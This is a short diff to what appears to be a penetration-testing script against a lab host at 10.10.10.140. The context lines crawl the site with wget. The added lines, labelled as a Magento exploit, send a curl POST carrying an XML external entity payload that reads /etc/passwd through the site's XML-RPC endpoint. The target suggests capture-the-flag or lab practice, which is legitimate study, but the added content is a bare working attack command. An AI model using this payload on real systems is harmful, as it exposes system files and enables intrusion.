@@ -9,3 +9,5 @@ SITE="http://10.10.10.140" &&
   grep -oP '(http:\/\/|https:\/\/)[^\s]*' |
   xargs wget -r -np -nH -R index.html
 
+# Magento RCE Vuln exploits/19793
+curl -X POST -d '<?xml version="1.0"?> <!DOCTYPE foo [  <!ELEMENT methodName ANY >  <!ENTITY xxe SYSTEM "file:///etc/passwd" >]><methodCall>  <methodName>&xxe;</methodName></methodCall>' http://10.10.10.140/index.php/api/xmlrpc
